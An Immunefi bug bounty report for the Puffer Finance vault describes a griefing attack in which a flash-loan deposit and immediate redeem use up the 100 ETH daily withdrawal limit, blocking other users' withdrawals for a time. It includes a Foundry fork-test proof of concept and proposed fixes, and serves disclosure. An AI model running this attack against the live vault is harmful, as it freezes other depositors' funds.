# 28656 - \[SC - Insight] Blocking redeemwithdraw from vault

Submitted on Feb 23rd 2024 at 04:20:29 UTC by @DuckAstronomer for [Boost | Puffer Finance](https://immunefi.com/bounty/pufferfinance-boost/)

Report ID: #28656

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0xd9a442856c234a39a81a089c06451ebaa4306a72>

Impacts:

* Temporary freezing of funds for at least 1 hour

## Description

## Vulnerability Details

The attacker can deplete daily withdrawal limit by taking flash loan, making a deposit and an immediate withdrawal. There is no risks or fees involved for the attacker. This behavior prevents benign users from redeeming/withdrawing from the vault.

By default there is a `100 ETH` daily limit for withdrawal.

```solidity
function initialize() public reinitializer(2) {
    // In this initialization, we swap out the underlying stETH with WETH
    ERC4626Storage storage erc4626Storage = _getERC4626StorageInternal();
    erc4626Storage._asset = _WETH;

    _setDailyWithdrawalLimit(100 ether);  // @audit
    _updateDailyWithdrawals(0);
}
```

To mitigate the issue:

* Replenish the daily limit whenever a mint/deposit occur.
* Prohibit flash deposit-redeem actions taking place in one tx.

## Proof of Concept

To run the PoC place the file inside `test/Integration/Immunefi.fork.t.sol` and run the following command.

```
ETH_RPC_URL=URL forge test --mp test/Integration/Immunefi.fork.t.sol --mt test_griefing  --fork-url URL --fork-block-number 19285430
```

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0 <0.9.0;

import { TestHelper } from "../TestHelper.sol";

import "forge-std/console.sol";

contract Immunefi is TestHelper {

    error ERC4626ExceededMaxRedeem(address owner, uint256 shares, uint256 max);

    // ETH_RPC_URL=URL forge test --mp test/Integration/Immunefi.fork.t.sol --mt test_griefing  --fork-url URL --fork-block-number 19285430
    function test_griefing() public {
        address attacker = address(101);
        address user = address(102);

        vm.deal(user, 10 ether);

        // 1. User deposits ETH.
        vm.startPrank(user);
        uint256 shares = pufferVault.depositETH{value: 10 ether}(user);
        vm.stopPrank();

        // 2. Attacker takes flash loan, deposits and then redeems.
        //    No loses/risks/fees for the attacker.
        //    Attacker depletes daily withdraw limit, which is 100 ETH by default.
        vm.deal(attacker, 100 ether);
        vm.startPrank(attacker);
        uint256 shares_attacker = pufferVault.depositETH{value: 100 ether}(attacker);
        pufferVault.redeem(shares_attacker, attacker, attacker);
        vm.stopPrank();

        // 3. No one can redeem/withdraw.
        vm.startPrank(user);
        vm.expectRevert(
            abi.encodeWithSelector(ERC4626ExceededMaxRedeem.selector, user, shares, pufferVault.maxRedeem(user))
        );
        pufferVault.redeem(shares, user, user);
        vm.stopPrank();
    }
}
```
